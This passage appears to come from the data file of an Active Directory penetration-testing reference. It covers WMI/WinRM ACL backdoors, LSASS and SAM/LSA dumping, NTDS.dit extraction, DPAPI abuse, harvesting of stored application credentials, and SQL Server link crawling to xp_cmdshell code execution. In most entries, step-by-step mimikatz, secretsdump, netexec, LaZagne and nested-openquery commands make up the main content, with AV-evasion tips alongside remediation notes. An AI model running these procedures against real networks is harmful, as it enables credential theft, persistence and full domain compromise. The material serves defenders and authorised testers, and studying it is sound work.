          { label: "Use it later (low-priv)", cmd: "Invoke-WmiMethod / Enter-PSSession as <user> -> admin actions" },
          { label: "Revert", cmd: "…-Remove to strip the added ACE" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. From admin, grant a low-priv user remote WMI rights", cmd: "# edits the __SystemSecurity descriptor on the WMI namespace to add <user>\nSet-RemoteWMI -SamAccountName <user> -ComputerName <dc> -namespace 'root\\cimv2' -Verbose\n# via Sliver: compile RACE.ps1 to .NET with PS2EXE, run with execute-assembly" },
              { label: "2. Grant remote PSRemoting (WinRM RootSDDL) rights", cmd: "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <dc> -Verbose\n# modifies the WinRM endpoint's security descriptor to allow <user>" },
              { label: "3. Later, return as the low-priv user and execute code", cmd: "# no admin required now — the ACL grants it:\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName <dc>\nEnter-PSSession -ComputerName <dc>            # as <user>" },
              { label: "4. Clean up / rotate the backdoor", cmd: "Set-RemoteWMI -SamAccountName <user> -ComputerName <dc> ... -Remove -Verbose\nSet-RemotePSRemoting -SamAccountName <user> -ComputerName <dc> -Remove -Verbose" }
            ]
          },
          {
            title: "Why It Works",
            type: "notes",
            items: [
              "Each remote subsystem carries its own security descriptor that the OS checks at connection time. Windows deliberately lets an administrator edit those descriptors, so adding an ACE for a chosen user is a supported operation — the low-priv user then passes the access check exactly like a legitimate admin would.",
              "The backdoor is stealthy because it changes permissions on existing, expected components rather than adding an artifact. There is no new user in the domain, no new local admin, no service binary and no scheduled task — the tripwires most monitoring watches for never fire.",
              "It survives credential resets: the grantee is an ordinary account whose password can rotate normally; the standing access comes from the ACE, not from a stolen secret.",
              "The same principle generalises across the SCM (service DACLs), the remote registry, and DCOM launch/access permissions — anywhere Windows exposes a descriptor an admin may edit, that descriptor can be turned into a persistence mechanism."
            ]
          },
          {
            title: "Backdoorable Surfaces",
            type: "table",
            columns: ["Surface", "What the ACL edit grants"],
            rows: [
              ["WMI namespace (root/cimv2)", "Remote WMI method execution (Win32_Process Create) as the granted user"],
              ["WinRM / PSRemoting (RootSDDL)", "Enter-PSSession / Invoke-Command against the host"],
              ["Service Control Manager", "Reconfigure/start a service -> code execution as its (often SYSTEM) account"],
              ["Remote registry", "Read/write sensitive keys (Run keys, service configs, stored secrets)"],
              ["DCOM launch/access", "Instantiate privileged COM objects remotely"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["RACE toolkit", "Set-RemoteWMI / Set-RemotePSRemoting — automate WMI and PSRemoting descriptor backdoors"],
              ["PS2EXE", "Compile RACE.ps1 to a .NET assembly so Sliver's execute-assembly can run it in memory"],
              ["sharp-wmi / Invoke-WmiMethod", "Return over the backdoored WMI namespace to execute code"],
              ["Sliver (execute-assembly)", "Deploy and trigger the descriptor edits from a foothold"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "RACE toolkit (Nikhil Mittal / SamratAshok)", url: "https://github.com/samratashok/RACE" },
              { label: "Pwning beyond Domain Admin — persistence via security descriptors", url: "https://cube0x0.github.io/Pocing-Beyond-DA/" },
              { label: "MITRE ATT&CK — Account Manipulation (T1098)", url: "https://attack.mitre.org/techniques/T1098/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Baseline and monitor the security descriptors on WMI namespaces, the WinRM RootSDDL, service DACLs and DCOM permissions; alert on ACE additions for non-administrative principals.",
              "Limit local administrator access (it is the prerequisite for setting these backdoors) with LAPS and tiered administration.",
              "Restrict who can reach WMI/WinRM remotely at the network layer, so a granted ACE still cannot be used from an arbitrary host.",
              "After any host or DC compromise, audit these descriptors as part of eviction — a password reset alone does not remove an ACL backdoor.",
              "Enable object-access auditing on the relevant subsystems so descriptor changes are logged centrally."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Credential Access",
    vulns: [
      {
        id: "lsass-dumping",
        name: "LSASS Memory Dumping",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1003/001/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "The LSASS process caches the secrets of logged-on users — dumping its memory yields NT hashes, Kerberos tickets, and sometimes cleartext.",
        brief: "The Local Security Authority Subsystem Service (LSASS) holds the credential material of every interactive session on a host: NT hashes, Kerberos tickets and keys, and — with legacy providers like WDigest — sometimes cleartext passwords. Any local administrator / SYSTEM context can read that memory.\n\nImpact: dumping LSASS on a single server that admins log into commonly yields a Domain Admin credential, which is why it is the pivot from local admin to domain compromise.",
        quickReference: [
          { label: "Mimikatz — dump logon passwords", cmd: "privilege::debug\nsekurlsa::logonpasswords" },
          { label: "Living-off-the-land dump (comsvcs.dll)", cmd: "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\temp\\lsass.dmp full" },
          { label: "Remote via NetExec", cmd: "netexec smb 10.10.10.10 -u admin -p 'Passw0rd' --lsa\nnetexec smb 10.10.10.10 -u admin -p 'Passw0rd' -M lsassy" },
          { label: "Parse an offline dump", cmd: "mimikatz # sekurlsa::minidump lsass.dmp   then  sekurlsa::logonpasswords\npypykatz lsa minidump lsass.dmp" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. From a SYSTEM/admin context, dump logon secrets with Mimikatz", cmd: "mimikatz.exe\nprivilege::debug          # acquire SeDebugPrivilege\nsekurlsa::logonpasswords  # NT hashes, Kerberos keys, WDigest cleartext if present\nsekurlsa::ekeys           # AES keys for overpass-the-hash / pass-the-key" },
              { label: "2. Stealthier: dump the process, exfil, parse offline (no mimikatz on host)", cmd: "# built-in Windows binary, no third-party tool on disk\nrundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\temp\\lsass.dmp full\n# then offline on your box:\npypykatz lsa minidump lsass.dmp" },
              { label: "3. Remote, at scale", cmd: "# NetExec dumps LSASS across hosts and parses automatically\nnetexec smb targets.txt -u admin -p 'Passw0rd' -M lsassy\n# nanodump / dumpert evade some AV by avoiding MiniDumpWriteDump" },
              { label: "4. Re-enable WDigest to force cleartext caching (noisy)", cmd: "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1\n# on the next logon, sekurlsa::logonpasswords returns cleartext" },
              { label: "5. Use the recovered material", cmd: "# NT hash -> pass-the-hash ; AES key -> pass-the-key ; TGT -> pass-the-ticket\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe" }
            ]
          },
          {
            title: "What LSASS Yields",
            type: "table",
            columns: ["Artifact", "Use"],
            rows: [
              ["NT hash", "Pass-the-hash, offline cracking"],
              ["Kerberos AES/RC4 keys (ekeys)", "Overpass-the-hash / pass-the-key"],
              ["Kerberos tickets (TGT/TGS)", "Pass-the-ticket"],
              ["WDigest cleartext", "Direct password (legacy/enabled systems)"],
              ["DPAPI master keys", "Decrypt DPAPI-protected secrets"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain local admin / SYSTEM on a host", "Right to read LSASS memory"],
              ["2", "Dump LSASS (mimikatz / comsvcs / nanodump)", "Credential material of logged-on users"],
              ["3", "Parse for hashes, keys, tickets", "Reusable secrets"],
              ["4", "If a privileged user was logged on", "Domain Admin credential"],
              ["5", "Pass-the-hash / ticket onward", "Lateral movement → domain compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Mimikatz", "sekurlsa::logonpasswords/ekeys, pth"],
              ["comsvcs.dll (LOLBin) / nanodump / dumpert", "Create an LSASS dump, evade AV"],
              ["pypykatz", "Parse a minidump offline on Linux"],
              ["NetExec (lsassy / --lsa)", "Remote dump + parse at scale"],
              ["procdump (Sysinternals)", "Signed binary to dump the process"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1003.001 — LSASS Memory", url: "https://attack.mitre.org/techniques/T1003/001/" },
              { label: "The Hacker Recipes — Dumping credentials", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enable LSA Protection (RunAsPPL) so LSASS runs as a protected process and cannot be read by normal admin tools.",
              "Deploy Credential Guard to isolate secrets in a VBS-protected container away from LSASS.",
              "Disable WDigest (UseLogonCredential = 0) so cleartext is never cached.",
              "Enforce tiered administration so Domain Admins never log on to lower-tier servers where LSASS can be dumped.",
              "Detect: handle opens to lsass.exe by non-system processes, comsvcs MiniDump usage, and creation of *.dmp of LSASS (EDR/Sysmon)."
            ]
          }
        ]
      },
      {
        id: "sam-lsa-secrets",
        name: "SAM & LSA Secrets",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1003/002/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "The local SAM stores local account hashes; LSA secrets store service-account passwords and cached domain credentials — all readable with local admin.",
        brief: "Every Windows host keeps local account NT hashes in the SAM registry hive and stores machine/service secrets (service-account passwords, auto-logon credentials, and cached domain logons) under LSA secrets. With local admin you can extract all of it, offline or remotely.\n\nImpact: a reused local administrator hash enables pass-the-hash across every machine that shares it; LSA secrets frequently hand over a service account's cleartext password; cached domain credentials can be cracked to recover a domain user's password even when the DC is unreachable.",
        quickReference: [
          { label: "Dump SAM + LSA + cached (offline hives)", cmd: "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM sys.hiv & reg save HKLM\\SECURITY sec.hiv\nsecretsdump.py -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL" },
          { label: "Remote (Impacket)", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@10.10.10.10" },
          { label: "NetExec", cmd: "netexec smb 10.10.10.10 -u admin -p 'Passw0rd' --sam --lsa" },
          { label: "Crack cached domain creds (mscash2)", cmd: "hashcat -m 2100 dcc2.txt rockyou.txt" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Save the registry hives (offline extraction avoids touching LSASS)", cmd: "reg save HKLM\\SAM     C:\\temp\\sam.hiv\nreg save HKLM\\SYSTEM  C:\\temp\\system.hiv    # holds the boot key to decrypt SAM\nreg save HKLM\\SECURITY C:\\temp\\security.hiv  # LSA secrets + cached creds" },
              { label: "2. Extract everything offline", cmd: "secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n#   local account NT hashes (SAM)\n#   $MACHINE.ACC and service secrets (LSA)\n#   $DCC2$ cached domain logons" },
              { label: "3. Or pull it remotely in one command", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@10.10.10.10\nnetexec smb 10.10.10.0/24 -u admin -H <local_admin_hash> --sam --lsa" },
              { label: "4. Reuse the local admin hash (if shared across the fleet)", cmd: "netexec smb 10.10.10.0/24 -u administrator -H <sam_nt_hash> --local-auth\n# a shared local admin password = pass-the-hash to every host (see LAPS remediation)" },
              { label: "5. Crack cached domain credentials for a real domain password", cmd: "hashcat -m 2100 \"\\$DCC2\\$10240#user#<hash>\" rockyou.txt\n# mscash2 is slow to crack but recovers a usable domain password when it falls" }
            ]
          },
          {
            title: "What Each Store Holds",
            type: "table",
            columns: ["Store", "Contents"],
            rows: [
              ["SAM", "Local account NT hashes (e.g. the local Administrator)"],
              ["LSA secrets", "Service-account passwords, auto-logon creds, machine account key"],
              ["Cached domain creds (DCC2)", "Last N domain logons — crackable offline (hashcat 2100)"],
              ["Boot key (SYSTEM hive)", "Required to decrypt the SAM"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Local admin on a host", "Read SAM/SECURITY/SYSTEM"],
              ["2", "Extract SAM + LSA + cached", "Local hashes, service secrets, DCC2"],
              ["3", "Pass-the-hash the local admin (if shared)", "Fleet-wide lateral movement"],
              ["4", "Crack LSA/service secret or DCC2", "Cleartext service/domain password"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket secretsdump.py", "Local (-sam/-system/-security) or remote extraction"],
              ["NetExec", "--sam --lsa across a subnet"],
              ["reg save / reg.exe", "Save the hives for offline parsing"],
              ["Mimikatz lsadump::sam / lsadump::secrets", "Windows-side extraction"],
              ["hashcat", "Crack cached domain creds (mode 2100)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1003.002 — Security Account Manager", url: "https://attack.mitre.org/techniques/T1003/002/" },
              { label: "The Hacker Recipes — SAM & LSA secrets", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Deploy LAPS so every host has a unique, rotated local administrator password — this breaks fleet-wide pass-the-hash of the local admin.",
              "Limit cached domain logons (CachedLogonsCount) on servers that do not need offline logon.",
              "Protect service accounts with gMSA so their LSA-stored secret is not a crackable static password.",
              "Restrict local admin rights; the whole technique requires them.",
              "Detect: reg save of SAM/SECURITY/SYSTEM, remote registry access, and secretsdump-style SMB activity."
            ]
          }
        ]
      },
      {
        id: "ntds-extraction",
        name: "NTDS.dit Extraction",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1003/003/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "The domain database NTDS.dit holds every domain account's hashes — extracting it from a DC yields the entire domain's credentials.",
        brief: "On a domain controller, NTDS.dit is the directory database, and it contains the password hashes (and Kerberos keys) of every account in the domain — including krbtgt and every Domain Admin. With DC admin, an attacker copies it (via Volume Shadow Copy to dodge the file lock) and extracts the lot offline.\n\nImpact: this is total domain compromise. Unlike DCSync (which pulls specific accounts over the replication protocol), NTDS extraction takes the whole database at once — every hash, every Kerberos key.",
        quickReference: [
          { label: "Remote (Impacket, uses DRSUAPI or VSS)", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@dc01 -just-dc" },
          { label: "NetExec", cmd: "netexec smb dc01 -u admin -p 'Passw0rd' --ntds" },
          { label: "On-DC: shadow copy + grab the files", cmd: "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ifm\" q q" },
          { label: "Parse offline (ntds + system hive)", cmd: "secretsdump.py -ntds ntds.dit -system system.hiv LOCAL" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. On the DC, create an offline copy (VSS avoids the live-file lock)", cmd: "# ntdsutil IFM writes a consistent copy of NTDS.dit + the SYSTEM hive\nntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ifm\" quit quit\n# alt: vssadmin create shadow /for=C: then copy \\\\?\\GLOBALROOT\\...\\NTDS\\ntds.dit" },
              { label: "2. Exfil the two files and extract offline", cmd: "secretsdump.py -ntds C:\\temp\\ifm\\Active Directory\\ntds.dit \\\n  -system C:\\temp\\ifm\\registry\\SYSTEM LOCAL -outputfile domain_hashes\n# dumps every account's NTLM hash and Kerberos keys" },
              { label: "3. Or pull it remotely without shell interaction", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@dc01 -just-dc\n#   -just-dc          only the domain secrets (uses DRSUAPI replication or VSS)\n#   -just-dc-ntlm     hashes only ; -just-dc-user krbtgt for one account" },
              { label: "4. Use the crown jewels", cmd: "# krbtgt hash -> Golden Ticket ; DA hash -> pass-the-hash ; crack the rest offline\nhashcat -m 1000 domain_hashes.ntds rockyou.txt   # NTLM" }
            ]
          },
          {
            title: "NTDS vs DCSync",
            type: "table",
            columns: ["Aspect", "Detail"],
            rows: [
              ["NTDS.dit extraction", "Copies the whole database file — every account at once"],
              ["DCSync", "Pulls chosen accounts over MS-DRSR replication, no file access"],
              ["Requires", "DC admin (NTDS) vs replication rights on the domain (DCSync)"],
              ["Both yield", "krbtgt, all DA hashes, Kerberos keys — total compromise"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Gain admin on a domain controller", "Access to NTDS.dit"],
              ["2", "Shadow-copy / IFM the database + SYSTEM hive", "Consistent offline copy"],
              ["3", "Extract hashes offline (secretsdump)", "Every domain account's hash + keys"],
              ["4", "Golden Ticket from krbtgt / PtH the DA", "Durable, total domain control"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket secretsdump.py", "-just-dc remote, or -ntds offline parsing"],
              ["NetExec", "--ntds convenience wrapper"],
              ["ntdsutil / vssadmin", "Create a shadow copy of the locked database on the DC"],
              ["Mimikatz / DSInternals", "Windows-side NTDS parsing"],
              ["hashcat", "Crack the recovered NTLM hashes (mode 1000)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1003.003 — NTDS", url: "https://attack.mitre.org/techniques/T1003/003/" },
              { label: "The Hacker Recipes — NTDS extraction", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Treat domain controllers as Tier-0: minimise who has DC admin, and manage them from a privileged access workstation only.",
              "Rotate krbtgt twice after any suspected DC compromise; assume every hash in the domain is burned.",
              "Monitor Volume Shadow Copy creation, ntdsutil IFM, and access to ntds.dit on DCs.",
              "Detect DRSUAPI replication from non-DC hosts (the DCSync path) as well as raw file copies.",
              "Enforce strong, unique passwords and consider periodic domain-wide password resets after an incident."
            ]
          }
        ]
      },
      {
        id: "dpapi-abuse",
        name: "DPAPI Abuse",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1555/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "Windows' Data Protection API encrypts browser passwords, saved RDP/Wi-Fi creds and vault secrets — the keys are recoverable, so the secrets are too.",
        brief: "DPAPI transparently encrypts per-user secrets — browser passwords and cookies, saved RDP and Wi-Fi credentials, Credential Manager vault entries, and application secrets. It is protected by a master key derived from the user's password, and domain-wide by a DPAPI backup key held on the DCs.\n\nImpact: with the user's password/hash, local admin, or the domain backup key, an attacker decrypts all of it. The domain backup key is the jackpot: one .pvk from the DC decrypts every domain user's DPAPI secrets on every host, frequently exposing credentials to systems and third parties outside AD entirely.",
        quickReference: [
          { label: "Extract the DPAPI domain backup key (with DA)", cmd: "dpapi.py backupkeys -t corp.local -u admin -p 'Passw0rd' --export" },
          { label: "Harvest at scale with the backup key", cmd: "donpapi collect -t targets.txt --pvk domain_backupkey.pvk -u admin -p 'Passw0rd' -d corp.local" },
          { label: "Mimikatz — decrypt a masterkey then a blob", cmd: "dpapi::masterkey /in:<masterkey> /rpc\ndpapi::cred /in:<credential_blob>" },
          { label: "SharpDPAPI (browser/vault/RDP)", cmd: "SharpDPAPI.exe triage" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. The jackpot: extract the DPAPI domain backup key once (needs DA)", cmd: "dpapi.py backupkeys -t corp.local -u admin -p 'Passw0rd' --export\n# writes a .pvk that decrypts EVERY domain user's DPAPI secrets, on any host, forever" },
              { label: "2. Sweep hosts and decrypt everything with that key", cmd: "donpapi collect -t targets.txt --pvk domain_backupkey.pvk \\\n  -u admin -p 'Passw0rd' -d corp.local\n# browser passwords/cookies, Credential Manager, RDP, Wi-Fi, scheduled-task creds" },
              { label: "3. Without the backup key: decrypt with the user's password/hash locally", cmd: "# masterkey is unlocked by the user's password (or their SHA1/NT hash)\nmimikatz # dpapi::masterkey /in:\"%APPDATA%\\Microsoft\\Protect\\<SID>\\<GUID>\" /password:UserPass\nmimikatz # dpapi::cred /in:\"%APPDATA%\\Microsoft\\Credentials\\<blob>\"" },
              { label: "4. Triage a compromised host quickly", cmd: "SharpDPAPI.exe triage        # dumps Credential Manager, vaults, RDP\nSharpChrome.exe logins       # Chrome/Edge saved passwords and cookies" },
              { label: "5. Pivot outward", cmd: "# recovered secrets often reach cloud consoles, VPNs, and partner systems\n# outside the AD boundary — a scope note, not just a domain finding" }
            ]
          },
          {
            title: "Decryption Paths",
            type: "table",
            columns: ["Method", "When it applies"],
            rows: [
              ["User password / NT hash", "Decrypts that user's master keys and everything under them"],
              ["DPAPI domain backup key (.pvk)", "Decrypts every domain user's DPAPI data on any host — the jackpot"],
              ["Local SYSTEM", "Machine-scope DPAPI secrets (e.g. some service creds)"],
              ["Why the backup key wins", "One key, domain-wide, no per-user password needed"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Reach DA (or a user's password/hash, or local admin)", "A viable decryption path"],
              ["2", "Extract the domain backup key (best case)", "Domain-wide DPAPI master key"],
              ["3", "Sweep hosts and decrypt DPAPI blobs", "Browser/RDP/Wi-Fi/vault credentials"],
              ["4", "Reuse recovered creds", "Access to internal + external systems"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket dpapi.py", "Extract the domain backup key; decrypt masterkeys/blobs"],
              ["DonPAPI", "Remote, scaled DPAPI harvesting with the backup key"],
              ["Mimikatz (dpapi::)", "Decrypt masterkeys, credentials, vaults"],
              ["SharpDPAPI / SharpChrome", "Triage browser, vault, RDP secrets on Windows"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1555 — Credentials from Password Stores", url: "https://attack.mitre.org/techniques/T1555/" },
              { label: "The Hacker Recipes — DPAPI", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Protect domain controllers — the DPAPI backup key lives there and is domain-wide game over if stolen.",
              "Discourage browser password storage for privileged accounts; use a managed password manager instead.",
              "Rotate credentials broadly after a DA compromise, including secrets that DPAPI protected (cloud, VPN, third-party).",
              "Deploy Credential Guard and LSA protection to limit the material an attacker can reach in the first place.",
              "Detect: access to the DPAPI backup key on DCs, and mass reads of \\AppData\\...\\Protect and \\Credentials across hosts."
            ]
          }
        ]
      },
      {
        id: "stored-cred-harvest",
        name: "Stored / Application Credential Harvesting",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1552/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "Installed applications save passwords insecurely — FTP/SSH clients, email, IM, database tools and saved RDP/PuTTY sessions all give up credentials to a local harvester.",
        brief: "Beyond OS credential stores, ordinary applications persist passwords: FTP/SFTP clients (FileZilla, WinSCP, CoreFTP), SSH sessions (PuTTY/SuperPuTTY), email and IM clients, database GUIs (HeidiSQL), VNC, and saved RDP sessions. Many store them weakly (registry, XML, reversible encryption).\n\nImpact: harvesting these on a single foothold routinely yields credentials to file servers, databases, network devices, and other users' systems — often the fastest lateral-movement fuel available, requiring only user-level access to that profile.",
        quickReference: [
          { label: "LaZagne — dump everything on the host", cmd: "lazagne.exe all" },
          { label: "SessionGopher — saved RDP/WinSCP/PuTTY/FileZilla sessions", cmd: "Import-Module SessionGopher.ps1; Invoke-SessionGopher -Thorough" },
          { label: "Metasploit post modules", cmd: "use post/windows/gather/credentials/winscp   (also filezilla_client_cred, coreftp, vnc, heidisql, ...)" },
          { label: "Nirsoft utilities", cmd: "Mail PassView, PstPassword, WebBrowserPassView, VNCPassView" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Broad sweep with LaZagne (user context is enough)", cmd: "lazagne.exe all\n# harvests browsers, FTP/SSH clients, email, IM, databases, Wi-Fi, sysadmin tools\nlazagne.exe browsers -oN   # scope to a category, output to file" },
              { label: "2. Saved remote-session credentials with SessionGopher", cmd: "powershell -ep bypass\nImport-Module .\\SessionGopher.ps1\nInvoke-SessionGopher -Thorough\n# RDP .rdp, WinSCP, PuTTY/SuperPuTTY, FileZilla saved sessions & passwords\nInvoke-SessionGopher -AllDomain -o   # sweep the whole domain remotely" },
              { label: "3. Metasploit post-exploitation modules (from an existing session)", cmd: "use post/windows/gather/credentials/winscp\nset session 1\nexploit\n# also: filezilla_client_cred, coreftp, ftpnavigator, vnc, heidisql, pidgin_cred" },
              { label: "4. Nirsoft point tools for specific apps", cmd: "# email: Mail PassView ; Outlook PST: PstPassword ; browsers: WebBrowserPassView\n# VNC: VNCPassView — each recovers cleartext from that app's store" },
              { label: "5. Reuse immediately for lateral movement", cmd: "# a recovered WinSCP/SSH cred to a file server, or a DB GUI cred, is a direct pivot\nnetexec smb fileserver -u <found_user> -p '<found_pass>'" }
            ]
          },
          {
            title: "Where Applications Hide Secrets",
            type: "table",
            columns: ["Application", "Storage / weakness"],
            rows: [
              ["WinSCP", "Registry / .ini, reversibly encrypted (or plaintext)"],
              ["FileZilla", "sitemanager.xml / recentservers.xml, base64/plaintext"],
              ["PuTTY / SuperPuTTY", "Registry sessions; SuperPuTTY XML can hold passwords"],
              ["CoreFTP / FTP Navigator", "Registry, weak encryption"],
              ["HeidiSQL / DB GUIs", "Saved connection passwords"],
              ["Saved RDP (.rdp)", "DPAPI-protected password (see DPAPI Abuse)"],
              ["VNC", "Registry, reversible fixed-key encryption"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Land on a user's workstation/server", "Access to their app profiles"],
              ["2", "Run LaZagne / SessionGopher / MSF modules", "Cleartext app credentials"],
              ["3", "Identify creds to other hosts/services", "Movement targets"],
              ["4", "Authenticate to those targets", "Lateral movement / privilege gain"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["LaZagne", "Broad multi-application credential recovery"],
              ["SessionGopher", "Saved RDP/WinSCP/PuTTY/FileZilla sessions"],
              ["Metasploit post/*/credentials/*", "Per-application dump modules"],
              ["Nirsoft (Mail PassView, PstPassword, ...)", "Point recovery for specific apps"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1552 — Unsecured Credentials", url: "https://attack.mitre.org/techniques/T1552/" },
              { label: "HackingArticles — Credential Dumping series", url: "https://www.hackingarticles.in/credential-dumping/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Discourage 'save password' in FTP/SSH/DB clients on privileged or shared systems; use a vaulted password manager.",
              "Prefer key-based auth (SSH keys with passphrases, certificate auth) over stored passwords.",
              "Restrict interactive logon and admin rights so a single foothold does not expose many stored credentials.",
              "Rotate any credential that could have been harvested after a host compromise.",
              "Detect: execution of LaZagne/SessionGopher, and reads of known application credential files/registry keys."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Lateral Movement",
    vulns: [
      {
        id: "sql-server-links",
        name: "SQL Server Trusted Database Links",
        severity: "High",
        ref: "https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/",
        description: "Linked SQL servers trust each other for queries, letting an attacker crawl the links to reach xp_cmdshell RCE and often a higher-privileged context.",
        brief: "A database link is a persistent trust configured on one SQL Server so it can query another. When links are chained across an estate, a low-privileged user on the first reachable instance can issue queries that execute on a linked instance using the link's stored credentials — which are frequently more privileged. Following the chain (link crawling) can reach an instance where the link context is sysadmin.\n\nImpact: lateral movement and remote code execution across SQL Servers via xp_cmdshell, often escalating privilege at each hop, without any additional credentials. It is common because links are set up for legitimate cross-server queries and rarely audited or de-privileged.",
        quickReference: [
          { label: "Enumerate SQL instances (SPNs)", cmd: "Get-SQLInstanceDomain            # PowerUpSQL / SharpSQL" },
          { label: "Check your rights on an instance", cmd: "Get-UserPrivs -Instance <sql-fqdn>" },
          { label: "Crawl links + run a command", cmd: "Get-SQLServerLinkCrawl -Instance <sql> -Query \"exec master..xp_cmdshell 'whoami'\"" },
          { label: "Manual link query", cmd: "SELECT * FROM openquery(\"LINKEDSRV\", 'select @@version')" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Discover SQL Server instances in the domain", cmd: "# SQL servers register MSSQLSvc SPNs — enumerate them via LDAP\nGet-SQLInstanceDomain            # PowerUpSQL / SharpSQL\n# e.g. via Sliver: execute-assembly -p explorer.exe -t 80 'SharpSQL.exe' 'Get-SQLInstanceDomain'" },
              { label: "2. Find an instance you can authenticate to", cmd: "Get-UserPrivs -Instance <sql-instance>\n# [*] Authenticated to: <sql-instance>   CONNECT SQL / VIEW ANY DATABASE\n# your domain user may have CONNECT rights on one instance even without sysadmin" },
              { label: "3. Enumerate configured database links from that instance", cmd: "Get-SQLServerLink -Instance <sql-instance>\n-- or in SQL:\nSELECT srvname, srvproduct, rpcout FROM master..sysservers;" },
              { label: "4. Crawl the link chain (each hop runs as the link's stored login)", cmd: "# link crawling follows every reachable link recursively and reports the context at each hop\nGet-SQLServerLinkCrawl -Instance <sql-instance>\n# Path: {DCORP-MSSQL} -> {DCORP-MSSQL, DCORP-SQL1(user: dblinkuser)} -> {..., DCORP-MGMT}\n# note where 'Sysadmin : 1' appears on a downstream instance" },
              { label: "5. Execute commands on a linked server (RCE via xp_cmdshell)", cmd: "# run a command on the far end of the chain; enable xp_cmdshell if needed\nGet-SQLServerLinkCrawl -Instance <sql-instance> \\\n  -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <target-sql>\n-- manual nested openquery to reach a two-hop link:\nSELECT * FROM openquery(\"DCORP-SQL1\", 'SELECT * FROM openquery(\"DCORP-MGMT\",''exec master..xp_cmdshell ''''whoami'''''')')" },
              { label: "6. Turn RCE into a foothold", cmd: "# xp_cmdshell runs as the SQL Server service account on the linked host\n# use it to run a loader / Sliver shellcode and beacon back from that server" }
            ]
          },
          {
            title: "Why the Chain Escalates",
            type: "table",
            columns: ["Property", "Consequence"],
